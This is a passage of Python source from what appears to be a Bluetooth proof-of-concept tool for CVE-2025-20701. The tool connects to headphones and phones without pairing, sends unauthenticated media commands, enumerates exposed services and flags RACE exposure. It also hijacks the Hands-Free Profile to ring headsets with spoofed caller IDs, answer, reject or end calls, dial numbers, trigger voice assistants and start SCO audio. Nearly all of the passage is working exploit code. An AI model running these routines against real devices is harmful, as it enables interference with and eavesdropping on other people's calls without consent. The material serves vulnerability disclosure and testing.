                    f"\n  \033[0;33m⚠ AVRCP connection cancelled (attempt {avrcp_attempt + 1}/{avrcp_retries})\033[0m")
                if avrcp_attempt < avrcp_retries - 1:
                    print(f"    Connection may have dropped. Reconnecting...")
                    # Reconnect the underlying BR/EDR connection
                    try:
                        await checker.close()
                    except Exception:
                        pass
                    await asyncio.sleep(1.0)

                    # Re-setup checker
                    checker = RFCOMMBumbleChecker(
                        controller, target_address, False)
                    await checker.setup()

                    try:
                        checker.connection = await asyncio.wait_for(
                            checker.device.connect(
                                target_address, transport=BT_BR_EDR_TRANSPORT),
                            timeout=timeout
                        )
                        connection = checker.connection
                        print(f"    \033[1;32m✓ Reconnected!\033[0m")
                    except Exception as reconn_err:
                        print(
                            f"    \033[0;31m✗ Reconnection failed: {reconn_err}\033[0m")
                        continue
                else:
                    print(
                        f"\n  \033[1;31m✗ AVRCP connection failed after {avrcp_retries} attempts.\033[0m")
                    print(f"    The device may be rejecting the AVRCP connection.")
                    print(
                        f"    Try disconnecting the speaker from other devices first.")
                    return
            except Exception as e:
                error_str = str(e).lower()
                if "cancelled" in error_str:
                    print(
                        f"\n  \033[0;33m⚠ Connection lost during AVRCP setup (attempt {avrcp_attempt + 1}/{avrcp_retries})\033[0m")
                    if avrcp_attempt < avrcp_retries - 1:
                        await asyncio.sleep(1.0)
                        continue
                print(f"\n  \033[1;31m✗ AVRCP connection failed: {e}\033[0m")
                print(f"  Device may require authentication for AVRCP.")
                return

        if avrcp_protocol is None:
            print(
                f"\n  \033[1;31m✗ Failed to establish AVRCP connection.\033[0m")
            return

        await asyncio.sleep(0.3)

        if action == "info":
            print(f"\n\033[1;36m{'─' * term_width}\033[0m")
            print(f"\033[1;36m  DEVICE INFO (unauthenticated)\033[0m")
            print(f"\033[1;36m{'─' * term_width}\033[0m\n")

            # Get supported events
            try:
                print(f"  Querying capabilities...")
                events = await asyncio.wait_for(
                    avrcp_protocol.get_supported_events(),
                    timeout=5.0
                )
                print(f"  \033[1;32mSupported Events:\033[0m")
                for event in events:
                    print(f"    • {event.name}")
            except Exception as e:
                print(f"  \033[0;33m⚠ Could not get events: {e}\033[0m")

            # Get play status
            try:
                print(f"\n  Querying play status...")
                status = await asyncio.wait_for(
                    avrcp_protocol.get_play_status(),
                    timeout=5.0
                )
                print(f"  \033[1;32mPlay Status:\033[0m")
                print(
                    f"    • Status: {status.play_status.name if status.play_status else 'Unknown'}")
                if status.song_length and status.song_length != 0xFFFFFFFF:
                    mins, secs = divmod(status.song_length // 1000, 60)
                    print(f"    • Song Length: {mins}:{secs:02d}")
                if status.song_position and status.song_position != 0xFFFFFFFF:
                    mins, secs = divmod(status.song_position // 1000, 60)
                    print(f"    • Position: {mins}:{secs:02d}")
            except Exception as e:
                print(f"  \033[0;33m⚠ Could not get play status: {e}\033[0m")

            # Get track info
            try:
                print(f"\n  Querying track info...")
                attributes = await asyncio.wait_for(
                    avrcp_protocol.get_element_attributes(
                        0,
                        [avrcp.MediaAttributeId.TITLE, avrcp.MediaAttributeId.ARTIST_NAME,
                            avrcp.MediaAttributeId.ALBUM_NAME]
                    ),
                    timeout=5.0
                )
                if attributes:
                    print(f"  \033[1;32mTrack Info:\033[0m")
                    for attr in attributes:
                        print(
                            f"    • {attr.attribute_id.name}: {attr.attribute_value}")
            except Exception as e:
                print(f"  \033[0;33m⚠ Could not get track info: {e}\033[0m")

            print(
                f"\n  \033[1;32m✓ Successfully accessed device WITHOUT authentication!\033[0m")
            print(f"\n  Control commands:")
            print(f"    \033[0;36m... avrcp --action play\033[0m")
            print(f"    \033[0;36m... avrcp --action pause\033[0m")
            print(f"    \033[0;36m... avrcp --action next\033[0m")
            print(f"    \033[0;36m... avrcp --action vol-up --repeat 5\033[0m")

        else:
            # Send media control command
            operation = AVRCP_OPERATIONS.get(action)
            if not operation:
                print(f"\n  \033[0;31m✗ Unknown action: {action}\033[0m")
                return

            print(f"\n\033[1;36m{'─' * term_width}\033[0m")
            print(f"\033[1;36m  SENDING {action.upper()} (no auth)\033[0m")
            print(f"\033[1;36m{'─' * term_width}\033[0m\n")

            for i in range(repeat_count):
                if repeat_count > 1:
                    print(f"  [{i+1}/{repeat_count}] ", end="")
                else:
                    print(f"  ", end="")

                try:
                    print(f"Sending {action}... ", end="", flush=True)
                    await avrcp_protocol.send_key_event(operation, True)
                    await asyncio.sleep(hold_time)
                    await avrcp_protocol.send_key_event(operation, False)
                    print(f"\033[1;32m✓ Success!\033[0m")

                    if i < repeat_count - 1:
                        await asyncio.sleep(0.2)
                except Exception as e:
                    print(f"\033[0;31m✗ Failed: {e}\033[0m")

            print(
                f"\n  \033[1;32m✓ Command sent without authentication!\033[0m")

        print(f"\n\033[1;36m{'═' * term_width}\033[0m\n")

    except Exception as e:
        logging.error("AVRCP control failed: %s", e)
        import traceback
        traceback.print_exc()
    finally:
        await checker.close()


async def command_enumerate_classic(args: argparse.Namespace):
    """Enumerate Bluetooth Classic services without pairing (CVE-2025-20701 PoC).

    This command demonstrates the impact of CVE-2025-20701 by connecting to a
    device via Bluetooth Classic without authentication and enumerating all
    exposed services via SDP (Service Discovery Protocol).
    """
    from bumble.core import BT_BR_EDR_TRANSPORT

    # Select controller if not specified
    controller = select_bluetooth_controller(args.controller)
    if not controller:
        return

    # Release Bluetooth controller
    release_bluetooth_controller(controller)

    # If no target address, scan for Classic devices
    target_address = args.target_address
    if not target_address:
        devices = await scan_classic_devices(controller, timeout=10.0)
        target_address = select_classic_device(devices, None)
        if not target_address:
            return
        # Need to release again after scanning
        release_bluetooth_controller(controller)

    logging.info("=" * 60)
    logging.info("CVE-2025-20701: Missing BR/EDR Authentication - PoC")
    logging.info("=" * 60)
    logging.info("")
    logging.info(
        "This vulnerability allows connecting to Bluetooth Classic devices"
    )
    logging.info(
        "WITHOUT pairing. Normally, devices should require user confirmation"
    )
    logging.info(
        "before allowing profile connections. Vulnerable devices skip this."
    )
    logging.info("")

    # Create checker to connect
    checker = RFCOMMBumbleChecker(controller, target_address, False)
    await checker.setup()

    logging.info("Connecting to %s without authentication...",
                 target_address)

    max_retries = 3
    retry_delay = 3.0
    connected = False

    for attempt in range(max_retries + 1):
        try:
            if checker.device is None:
                logging.error("Bluetooth device not initialized")
                return
            checker.connection = await checker.device.connect(  # type: ignore[misc]
                target_address, transport=BT_BR_EDR_TRANSPORT
            )
            connected = True
            break
        except Exception as e:  # pylint: disable=broad-exception-caught
            error_str = str(e).lower()

            if "limited_resources" in error_str:
                if attempt == 0:
                    logging.warning(
                        "Connection rejected by remote device - "
                        "device has too many active connections."
                    )
                else:
                    logging.warning("Retry %d/%d failed.",
                                    attempt, max_retries)

                if attempt < max_retries:
                    await checker.close()
                    reset_usb_bluetooth_controller(controller)
                    release_bluetooth_controller(controller)
                    logging.info(
                        "Waiting %.1f seconds before retry %d/%d...",
                        retry_delay, attempt + 1, max_retries
                    )
                    await asyncio.sleep(retry_delay)
                    retry_delay *= 1.5
                    checker = RFCOMMBumbleChecker(
                        controller, target_address, False)
                    await checker.setup()
                else:
                    logging.error(
                        "All %d retries exhausted. Target device may be busy.",
                        max_retries
                    )
                    await checker.close()
                    return

            elif "page_timeout" in error_str:
                logging.error("Connection failed: %s", e)
                logging.info("")
                logging.info("PAGE TIMEOUT - The device did not respond.")
                logging.info("Possible causes:")
                logging.info("  1. Device is out of range (try moving closer)")
                logging.info("  2. Device is powered off or in sleep mode")
                logging.info("  3. Device is not in connectable mode")
                logging.info("  4. Bluetooth address may be incorrect")
                logging.info("")
                logging.info(
                    "Tip: Make sure the target device is awake and nearby.")
                await checker.close()
                return

            elif "authentication" in error_str or "rejected" in error_str:
                logging.error("Connection failed: %s", e)
                logging.info("")
                logging.info("Connection was REJECTED by the device.")
                logging.info(
                    "This may mean the device is PATCHED against CVE-2025-20701."
                )
                await checker.close()
                return

            else:
                logging.error("Connection failed: %s", e)
                logging.info("")
                logging.info("Connection could not be established.")
                await checker.close()
                return

    if not connected:
        return

    logging.info("Connected successfully WITHOUT pairing!")
    logging.info("")
    logging.info("-" * 60)
    logging.info("IMPACT: The following services are accessible without auth:")
    logging.info("-" * 60)

    # Get device name
    try:
        name = await checker.connection.request_remote_name()
        logging.info("Device Name: %s", name)
    except Exception:  # pylint: disable=broad-exception-caught
        logging.info("Device Name: (could not retrieve)")

    # Enumerate all RFCOMM services
    from bumble.rfcomm import find_rfcomm_channels
    from bumble.core import UUID as BumbleUUID
    channels = await find_rfcomm_channels(checker.connection)

    def format_uuid(uuid_obj) -> str:
        """Format a UUID object to a readable string with name if known."""
        if isinstance(uuid_obj, BumbleUUID):
            # Get the string representation and name
            uuid_str = str(uuid_obj)
            if uuid_obj.name and uuid_obj.name != uuid_str:
                return f"{uuid_obj.name} ({uuid_str})"
            return uuid_str
        return str(uuid_obj)

    def format_uuids(uuids) -> str:
        """Format a list of UUIDs to a readable string."""
        if isinstance(uuids, list):
            return ", ".join(format_uuid(u) for u in uuids)
        return format_uuid(uuids)

    if channels:
        logging.info("")
        logging.info("RFCOMM Services (Serial Port Profile):")
        for channel, service_info in channels.items():
            uuid_str = format_uuids(
                service_info) if service_info else "Unknown"
            logging.info("  Channel %2d: %s", channel, uuid_str)

            # Check if it's a known RACE UUID
            known_uuid = RFCOMMTransport._matches_any_known_uuid(service_info)
            if known_uuid:
                logging.info(
                    "             ^^^ RACE PROTOCOL EXPOSED! (CVE-2025-20702)")
    else:
        logging.info("No RFCOMM services found.")

    # Check for HFP (Hands-Free Profile)
    logging.info("")
    logging.info("Checking for common profiles...")

    try:
        from bumble.hfp import find_hf_sdp_record
        hfp_record = await find_hf_sdp_record(checker.connection)
        if hfp_record:
            channel, _, _ = hfp_record
            logging.info(
                "  HFP (Hands-Free Profile): Channel %d - ACCESSIBLE", channel)
            logging.info("    -> Attacker could intercept/inject audio calls!")
    except Exception:  # pylint: disable=broad-exception-caught
        pass

    # Summary
    logging.info("")
    logging.info("=" * 60)
    logging.info("VULNERABILITY CONFIRMED: CVE-2025-20701")
    logging.info("=" * 60)
    logging.info("")
    logging.info(
        "This device allows Bluetooth Classic connections without pairing.")
    logging.info("An attacker within Bluetooth range (~10m) can:")
    logging.info("  1. Connect to the device without user consent")
    logging.info("  2. Access exposed Bluetooth profiles (HFP, A2DP, etc.)")
    logging.info(
        "  3. If RACE is exposed, fully compromise the device (CVE-2025-20702)")
    logging.info("")

    await checker.close()


async def command_hfp_demo(args: argparse.Namespace):
    """Demonstrate Hands-Free Profile access without pairing (CVE-2025-20701).

    This command shows the impact of the BR/EDR authentication bypass by
    connecting to the Hands-Free Profile and demonstrating control capabilities.

    It will try both roles:
    - HF (Hands-Free) role: For connecting to phones/audio gateways
    - AG (Audio Gateway) role: For connecting to headphones/earbuds
    """
    from bumble.hfp import (
        HfProtocol, HfConfiguration, HfFeature,
        AgProtocol, AgConfiguration, AgFeature, AgIndicatorState,
        AgIndicator, CallLineIdentification,
        _ESCO_PARAMETERS_CVSD_D1,  # For SCO audio setup
    )
    from bumble.rfcomm import Client as RFCOMM_Client
    from bumble.core import BT_BR_EDR_TRANSPORT
    from bumble import hfp
    from bumble.hci import (
        HCI_Enhanced_Setup_Synchronous_Connection_Command,
        HCI_SynchronousDataPacket,
        HCI_Command,
        HCI_UNKNOWN_HCI_COMMAND_ERROR,
    )
    import math  # For generating ringtone sine wave

    # Define the legacy HCI_Setup_Synchronous_Connection_Command
    # (Bumble only has the Enhanced version)
    # See Bluetooth Core Spec Vol 4, Part E, Section 7.1.26
    @HCI_Command.command(
        fields=[
            ('connection_handle', 2),
            ('transmit_bandwidth', 4),
            ('receive_bandwidth', 4),
            ('max_latency', 2),
            ('voice_setting', 2),
            ('retransmission_effort', 1),
            ('packet_type', 2),
        ],
    )
    class HCI_Setup_Synchronous_Connection_Command(HCI_Command):
        """Legacy Setup Synchronous Connection Command (opcode 0x0428)."""

    controller = args.controller or "usb:0"
    target_address = args.target_address
    action = getattr(args, 'action', 'info')
    dial_number = getattr(args, 'number', None)

    if not target_address:
        logging.error("Target address is required. Use --target-address")
        return

    logging.info("=" * 60)
    logging.info("CVE-2025-20701: Hands-Free Profile Exploitation Demo")
    logging.info("=" * 60)
    logging.info("")
    logging.info(
        "This demonstrates unauthorized access to the Hands-Free Profile.")
    logging.info("On vulnerable devices, an attacker can:")
    logging.info("  - Answer/reject incoming calls")
    logging.info("  - Initiate outgoing calls")
    logging.info("  - Hang up active calls")
    logging.info("  - Control voice recognition")
    logging.info("  - Access call history and device status")
    logging.info("")

    release_bluetooth_controller(controller)

    checker = RFCOMMBumbleChecker(controller, target_address, False)
    await checker.setup()

    logging.info("Connecting to %s...", target_address)

    try:
        if checker.device is None:
            logging.error("Bluetooth device not initialized")
            return
        checker.connection = await asyncio.wait_for(
            checker.device.connect(
                target_address, transport=BT_BR_EDR_TRANSPORT),
            timeout=30.0
        )
    except asyncio.TimeoutError:
        logging.error("Connection timed out after 30 seconds.")
        await checker.close()
        return
    except Exception as e:  # pylint: disable=broad-exception-caught
        error_str = str(e).lower()
        logging.error("Connection failed: %s", e)
        logging.info("")

        if "page_timeout" in error_str:
            logging.info("PAGE TIMEOUT - The device did not respond.")
            logging.info("")
            logging.info("Possible causes:")
            logging.info("  1. Device is out of range (try moving closer)")
            logging.info("  2. Device is powered off or in sleep mode")
            logging.info("  3. Device is not in connectable mode")
            logging.info("  4. Bluetooth address may be incorrect")
            logging.info(
                "  5. Device may be actively connected to another phone")
            logging.info("")
            logging.info("Tips:")
            logging.info(
                "  - Wake up the device (tap it, take it out of case)")
            logging.info("  - Move closer to the device")
            logging.info(
                "  - Try disconnecting the device from your phone first")
        elif "limited_resources" in error_str:
            logging.info("Controller resources exhausted.")
            logging.info(
                "Try unplugging and replugging the USB Bluetooth adapter.")

        await checker.close()
        return

    logging.info("Connected!")
    logging.info("")

    # Try to find HFP services - check both HF and AG SDP records
    hf_record = None
    ag_record = None
    use_ag_role = False

    logging.info("-" * 60)
    logging.info("Searching for HFP services...")
    logging.info("-" * 60)

    # First, try to find HF service (target is a headset, we act as AG)
    logging.info("Looking for Hands-Free Unit (HF) service...")
    try:
        hf_record = await asyncio.wait_for(
            hfp.find_hf_sdp_record(checker.connection),
            timeout=15.0
        )
        if hf_record:
            channel, hf_version, hf_features = hf_record
            logging.info("  Found HF service on RFCOMM channel %d", channel)
            logging.info("  HFP Version: %s", hf_version)
            logging.info("  Features: 0x%04X", hf_features)
            logging.info("  -> Target is a HEADSET/EARBUDS (HF role)")
            logging.info("  -> We will connect as AUDIO GATEWAY (AG role)")
            use_ag_role = True
        else:
            logging.info("  Not found.")
    except asyncio.TimeoutError:
        logging.info("  SDP query timed out.")
    except Exception as e:  # pylint: disable=broad-exception-caught
        logging.info("  Query failed: %s", e)

    # If no HF service, try AG service (target is a phone, we act as HF)
    if not hf_record:
        logging.info("")
        logging.info("Looking for Audio Gateway (AG) service...")
        try:
            ag_record = await asyncio.wait_for(
                hfp.find_ag_sdp_record(checker.connection),
                timeout=15.0
            )
            if ag_record:
                channel, ag_version, ag_features = ag_record
                logging.info(
                    "  Found AG service on RFCOMM channel %d", channel)
                logging.info("  HFP Version: %s", ag_version)
                logging.info("  Features: 0x%04X", ag_features)
                logging.info("  -> Target is a PHONE (AG role)")
                logging.info("  -> We will connect as HANDS-FREE (HF role)")
                use_ag_role = False
            else:
                logging.info("  Not found.")
        except asyncio.TimeoutError:
            logging.info("  SDP query timed out.")
        except Exception as e:  # pylint: disable=broad-exception-caught
            logging.info("  Query failed: %s", e)

    if not hf_record and not ag_record:
        logging.error("")
        logging.error("No HFP service found on this device.")
        logging.error("The device may not support Hands-Free Profile.")
        await checker.close()
        return

    # Determine which channel to use
    if use_ag_role and hf_record:
        channel = hf_record[0]
    elif ag_record:
        channel = ag_record[0]
    else:
        logging.error("Could not determine HFP channel.")
        await checker.close()
        return

    logging.info("")
    logging.info("-" * 60)
    logging.info("Connecting to RFCOMM channel %d...", channel)
    logging.info("-" * 60)

    # Connect to RFCOMM
    rfcomm_mux = None
    try:
        rfcomm_client = RFCOMM_Client(checker.connection)
        rfcomm_mux = await asyncio.wait_for(rfcomm_client.start(), timeout=15.0)
        dlc = await asyncio.wait_for(rfcomm_mux.open_dlc(channel), timeout=15.0)
        logging.info("RFCOMM channel %d opened successfully!", channel)
    except asyncio.TimeoutError:
        logging.error("RFCOMM connection timed out.")
        await checker.close()
        return
    except Exception as e:  # pylint: disable=broad-exception-caught
        logging.error("RFCOMM connection failed: %s", e)
        await checker.close()
        return

    logging.info("")
    logging.info("-" * 60)
    if use_ag_role:
        logging.info("Initializing as AUDIO GATEWAY (AG)...")
    else:
        logging.info("Initializing as HANDS-FREE UNIT (HF)...")
    logging.info("-" * 60)

    slc_established = False
    hf_protocol = None
    ag_protocol = None

    if use_ag_role:
        # We act as Audio Gateway connecting to headset
        ag_config = AgConfiguration(
            supported_ag_features=[
                AgFeature.THREE_WAY_CALLING,
                AgFeature.VOICE_RECOGNITION_FUNCTION,
                AgFeature.REJECT_CALL,
                AgFeature.ENHANCED_CALL_STATUS,
                AgFeature.IN_BAND_RING_TONE_CAPABILITY,
            ],
            # Set initial indicator values - service=1 (network available) is critical!
            supported_ag_indicators=[
                AgIndicatorState(
                    AgIndicator.CALL, {0, 1}, current_status=0),  # No call
                AgIndicatorState(
                    AgIndicator.CALL_SETUP, {0, 1, 2, 3}, current_status=0),
                AgIndicatorState(
                    AgIndicator.CALL_HELD, {0, 1, 2}, current_status=0),
                AgIndicatorState(
                    AgIndicator.SERVICE, {0, 1}, current_status=1),  # SERVICE AVAILABLE!
                AgIndicatorState(
                    AgIndicator.SIGNAL, {0, 1, 2, 3, 4, 5}, current_status=5),  # Full signal
                AgIndicatorState(
                    AgIndicator.ROAM, {0, 1}, current_status=0),  # Not roaming
                AgIndicatorState(
                    AgIndicator.BATTERY_CHARGE, {0, 1, 2, 3, 4, 5}, current_status=5),
            ],
            supported_hf_indicators=[],
            supported_ag_call_hold_operations=[],
            supported_audio_codecs=[],
        )

        # Create protocol first
        ag_protocol = AgProtocol(dlc, ag_config)

        # Add packet-level logging by wrapping the DLC write
        original_write = dlc.write

        def logged_write(data):
            if isinstance(data, bytes):
                text = data.decode('utf-8', errors='replace').strip()
            else:
                text = str(data).strip()
            logging.debug(">>> TX (AG->HF): %s", repr(text))
            return original_write(data)

        dlc.write = logged_write

        # Wrap the protocol's AT command reader to log incoming data
        original_read_at = ag_protocol._read_at

        def logged_read_at(data):
            if isinstance(data, bytes):
                text = data.decode('utf-8', errors='replace').strip()
            else:
                text = str(data).strip()
            logging.debug("<<< RX (HF->AG): %s", repr(text))
            return original_read_at(data)

        ag_protocol._read_at = logged_read_at
        dlc.sink = ag_protocol._read_at

        logging.info("Waiting for headset to complete SLC handshake...")
        logging.info(
            "(The headset sends AT commands, we respond automatically)")

        # Set up event to wait for SLC completion
        slc_complete_event = asyncio.Event()

        def on_slc_complete():
            logging.info("SLC handshake completed by headset!")
            slc_complete_event.set()

        # Set up event handlers for interesting events from headset
        def on_answer():
            logging.info(">>> HEADSET: User answered the call!")

        def on_hang_up():
            logging.info(">>> HEADSET: User hung up the call!")

        def on_dial(number):
            logging.info(">>> HEADSET: User dialing %s", number)

        ag_protocol.on('slc_complete', on_slc_complete)
        ag_protocol.on('answer', on_answer)
        ag_protocol.on('hang_up', on_hang_up)
        ag_protocol.on('dial', on_dial)

        try:
            # Wait for SLC to complete with timeout
            await asyncio.wait_for(slc_complete_event.wait(), timeout=15.0)
            logging.info("")
            logging.info("SUCCESS! Full HFP SLC established as Audio Gateway!")
            logging.info(
                "The headset completed handshake WITHOUT pairing!")
            logging.info("")
            slc_established = True

        except asyncio.TimeoutError:
            logging.warning("SLC handshake timed out after 15 seconds.")
            logging.info("")
            logging.info("The headset did not complete the SLC handshake.")
            logging.info("This could mean:")
            logging.info("  - The device has been PATCHED")
            logging.info(
                "  - The device requires a different AG configuration")
            logging.info("  - The device is already connected to a phone")
            logging.info("")
            logging.info(
                "However, RFCOMM connection succeeded without pairing,")
            logging.info("which still indicates a potential vulnerability.")
        except Exception as e:  # pylint: disable=broad-exception-caught
            logging.warning("AG initialization failed: %s", e)
            logging.info("")
            logging.info(
                "NOTE: Connected to HFP RFCOMM channel without pairing!")
            logging.info("      The vulnerability is CONFIRMED.")
    else:
        # We act as Hands-Free connecting to phone
        hf_config = HfConfiguration(
            supported_hf_features=[
                HfFeature.THREE_WAY_CALLING,
                HfFeature.CLI_PRESENTATION_CAPABILITY,
                HfFeature.VOICE_RECOGNITION_ACTIVATION,
                HfFeature.REMOTE_VOLUME_CONTROL,
            ],
            supported_hf_indicators=[],
            supported_audio_codecs=[],
        )
        hf_protocol = HfProtocol(dlc, hf_config)

        logging.info("Initiating SLC handshake with phone...")

        try:
            await asyncio.wait_for(hf_protocol.initiate_slc(), timeout=15.0)
            logging.info("HFP Service Level Connection established!")
            logging.info("")
            logging.info("SUCCESS! Full unauthorized HFP access achieved.")
            logging.info("")
            slc_established = True
        except asyncio.TimeoutError:
            logging.warning("SLC initialization timed out.")
            logging.info("")
            logging.info(
                "NOTE: Connected to HFP RFCOMM channel without pairing!")
            logging.info(
                "      The SLC handshake timed out. The target may be")
            logging.info("      a headset (HF role), not a phone (AG role).")
            logging.info("")
            logging.info("      The vulnerability is CONFIRMED - we connected")
            logging.info("      without any pairing or authentication.")
            logging.info("")
        except Exception as e:  # pylint: disable=broad-exception-caught
            logging.warning("SLC initialization failed: %s", e)
            logging.info("")
            logging.info(
                "NOTE: RFCOMM connection to HFP succeeded without pairing!")
            logging.info(
                "      Full SLC setup failed, but the vulnerability is confirmed.")
            logging.info("")

    # Perform the requested action
    if slc_established and (hf_protocol or ag_protocol):
        logging.info("-" * 60)
        logging.info("Executing action: %s", action.upper())
        if use_ag_role:
            logging.info("(Acting as Audio Gateway)")
        else:
            logging.info("(Acting as Hands-Free Unit)")
        logging.info("-" * 60)
        logging.info("")

        try:
            if action == "info":
                if use_ag_role and ag_protocol:
                    # As AG, we control the headset
                    logging.info("Connected to headset as Audio Gateway.")
                    logging.info("")
                    logging.info("As AG, we can send real HFP commands:")
                    logging.info(
                        "  - Incoming call notification (--action dial --number X)")
                    logging.info("  - Ring alert (--action ring)")
                    logging.info("  - Volume control (--action volume)")
                    logging.info("  - End call (--action hangup)")
                    logging.info("")
                    logging.info("Available commands:")
                    logging.info(
                        "  --action dial --number <num> : "
                        "Send incoming call from <num>")
                    logging.info(
                        "  --action ring     : Send RING alert")
                    logging.info("  --action hangup   : End the call")
                    logging.info("  --action volume   : Set max volume")
                elif hf_protocol:
                    # As HF, query the phone
                    logging.info("Querying device status...")
                    try:
                        calls = await asyncio.wait_for(
                            hf_protocol.query_current_calls(),
                            timeout=5.0
                        )
                        if calls:
                            logging.info("Active calls:")
                            for call in calls:
                                logging.info("  - %s", call)
                        else:
                            logging.info("No active calls.")
                    except asyncio.TimeoutError:
                        logging.info(
                            "  (query timed out - device may not support this)")
                    except Exception as e:  # pylint: disable=broad-exception-caught
                        logging.info("  (query failed: %s)", e)

                    logging.info("")
                    logging.info("Available HF commands you can try:")
                    logging.info(
                        "  --action answer   : Answer an incoming call")
                    logging.info(
                        "  --action reject   : Reject an incoming call")
                    logging.info(
                        "  --action hangup   : Hang up the current call")
                    logging.info(
                        "  --action dial --number <num> : Dial a number")
                    logging.info(
                        "  --action voice    : Toggle voice recognition")

            elif action == "ring":
                if use_ag_role and ag_protocol:
                    logging.info("Sending RING notification to headset...")
                    try:
                        # Send ring notification with caller ID
                        number = dial_number or "+1234567890"
                        ag_protocol.send_ring()
                        # Create proper CLI object (type 145 = international format)
                        cli = CallLineIdentification(number=number, type=145)
                        ag_protocol.send_cli_notification(cli)
                        logging.info(
                            "RING sent! The headset should ring/announce call.")
                        logging.info("Caller ID sent: %s", number)
                    except Exception as e:  # pylint: disable=broad-exception-caught
                        logging.error("Ring command failed: %s", e)
                else:
                    logging.error("Ring is only available in AG role.")

            elif action == "answer":
                if hf_protocol:
                    logging.info("Sending ANSWER command...")
                    try:
                        await hf_protocol.answer_incoming_call()
                        logging.info(
                            "Answer command sent! Check the target device.")
                    except Exception as e:  # pylint: disable=broad-exception-caught
                        logging.error("Answer command failed: %s", e)
                else:
                    logging.error("Answer is only available in HF role.")

            elif action == "reject":
                if hf_protocol:
                    logging.info("Sending REJECT command...")
                    try:
                        await hf_protocol.reject_incoming_call()
                        logging.info(
                            "Reject command sent! Check the target device.")
                    except Exception as e:  # pylint: disable=broad-exception-caught
                        logging.error("Reject command failed: %s", e)
                else:
                    logging.error("Reject is only available in HF role.")

            elif action == "hangup":
                if hf_protocol:
                    logging.info("Sending HANGUP command...")
                    try:
                        await hf_protocol.terminate_call()
                        logging.info(
                            "Hangup command sent! Check the target device.")
                    except Exception as e:  # pylint: disable=broad-exception-caught
                        logging.error("Hangup command failed: %s", e)
                elif use_ag_role and ag_protocol:
                    logging.info("Ending call...")
                    try:
                        # Update indicators to show call ended
                        ag_protocol.update_ag_indicator(
                            AgIndicator.CALL_SETUP, 0)  # No call setup
                        ag_protocol.update_ag_indicator(
                            AgIndicator.CALL, 0)  # No active call
                        logging.info("Call ended - indicators updated.")
                    except Exception as e:  # pylint: disable=broad-exception-caught
                        logging.error("Hangup failed: %s", e)

            elif action == "dial":
                if not dial_number:
                    logging.error(
                        "Phone number required. Use --number <number>")
                elif hf_protocol:
                    logging.info("Dialing %s...", dial_number)
                    try:
                        # Send ATD command to dial
                        await hf_protocol.execute_command(f"ATD{dial_number};")
                        logging.info(
                            "Dial command sent! "
                            "The connected phone should be calling %s",
                            dial_number
                        )
                    except Exception as e:  # pylint: disable=broad-exception-caught
                        logging.error("Dial command failed: %s", e)
                elif use_ag_role and ag_protocol:
                    # As AG, send incoming call notification to headset
                    logging.info(
                        "Sending incoming call from %s to headset...",
                        dial_number)
                    try:
                        # Wait for headset to finish post-SLC setup
                        # (AT+CMER, AT+CLIP, AT+VGS, etc.)
                        logging.info(
                            "Waiting 3 seconds for headset post-SLC setup...")
                        await asyncio.sleep(3.0)

                        # DISABLE in-band ringtone - headset should use its own ringtone
                        # (We're not setting up SCO audio, so in-band won't work)
                        ag_protocol.set_inband_ringtone_enabled(False)
                        logging.info(
                            "Disabled in-band ringtone (headset uses own tone)")

                        # Set call setup indicator to incoming call (1)
                        ag_protocol.update_ag_indicator(
                            AgIndicator.CALL_SETUP, 1)
                        logging.info("Sent: +CIEV (callsetup=1)")

                        # Small delay before first RING
                        await asyncio.sleep(0.5)

                        # Send RING with caller ID
                        cli = CallLineIdentification(
                            number=dial_number, type=145)

                        # Send multiple RINGs (phones typically ring every 3s)
                        for i in range(10):
                            logging.info("Sending RING #%d...", i + 1)
                            ag_protocol.send_ring()
                            ag_protocol.send_cli_notification(cli)
                            logging.info(
                                "  RING + CLIP: \"%s\"", dial_number)

                            # Wait 3 seconds between rings
                            await asyncio.sleep(3.0)

                        logging.info("")
                        logging.info("Finished ringing. Ending call setup...")
                        # Clear call setup (call not answered)
                        ag_protocol.update_ag_indicator(
                            AgIndicator.CALL_SETUP, 0)
                    except Exception as e:  # pylint: disable=broad-exception-caught
                        logging.error("Incoming call failed: %s", e)
                else:
                    logging.error("Dial requires HF or AG connection.")

            elif action == "volume":
                if use_ag_role and ag_protocol:
                    logging.info("Setting speaker volume to maximum...")
                    try:
                        ag_protocol.set_speaker_volume(15)  # Max is 15
                        logging.info("Volume command sent!")
                    except Exception as e:  # pylint: disable=broad-exception-caught
                        logging.error("Volume command failed: %s", e)
                else:
                    logging.error(
                        "Volume control is only available in AG role.")

            elif action == "voice":
                if hf_protocol:
                    logging.info("Toggling voice recognition...")
                    try:
                        # Send BVRA command to toggle voice recognition
                        await hf_protocol.execute_command("AT+BVRA=1")
                        logging.info(
                            "Voice recognition command sent! "
                            "Check if Siri/Google Assistant activated."
                        )
                    except Exception as e:  # pylint: disable=broad-exception-caught
                        logging.error(
                            "Voice recognition command failed: %s", e)
                else:
                    logging.error(
                        "Voice command is only available in HF role.")

            elif action == "sco-ring":
                if use_ag_role and ag_protocol:
                    logging.info("=" * 60)
                    logging.info(
                        "Setting up SCO audio connection for ringtone...")
                    logging.info("=" * 60)
                    try:
                        # Get the ACL connection handle from the existing connection
                        # The checker has the device and connection
                        acl_connection = checker.connection
                        if not acl_connection:
                            logging.error("No ACL connection available")
                            raise RuntimeError("No ACL connection")

                        acl_handle = acl_connection.handle
                        logging.info(
                            "ACL connection handle: 0x%04X", acl_handle)

                        # Get ESCO parameters for CVSD codec
                        esco = _ESCO_PARAMETERS_CVSD_D1

                        # Set up event to wait for SCO connection
                        sco_connected = asyncio.Event()
                        # Use list to allow modification in closure
                        sco_handle = [None]

                        def on_sco_connection(sco_link):
                            """Handle SCO connection complete event.

                            Args:
                                sco_link: ScoLink object with handle, link_type, etc.
                            """
                            logging.info(
                                "SCO connection established! "
                                "Handle: 0x%04X, Link type: %s",
                                sco_link.handle, sco_link.link_type)
                            sco_handle[0] = sco_link.handle
                            sco_connected.set()

                        def on_sco_failure(error):
                            """Handle SCO connection failure."""
                            logging.error(
                                "SCO setup failed: %s", error)

                        # Register SCO event handlers
                        device = checker.device
                        device.on('sco_connection', on_sco_connection)
                        device.on('sco_connection_failure', on_sco_failure)

                        # Try Enhanced Setup Synchronous Connection first,
                        # fall back to legacy if controller doesn't support it
                        sco_setup_success = False

                        logging.info(
                            "Trying Enhanced Setup Synchronous Connection...")
                        logging.info("  Codec: CVSD")
                        logging.info("  Packet type: HV3")
                        logging.info("  Bandwidth: 8000 bytes/sec")

                        # Send the Enhanced Setup Synchronous Connection command
                        cmd = HCI_Enhanced_Setup_Synchronous_Connection_Command(
                            connection_handle=acl_handle,
                            transmit_bandwidth=esco.transmit_bandwidth,
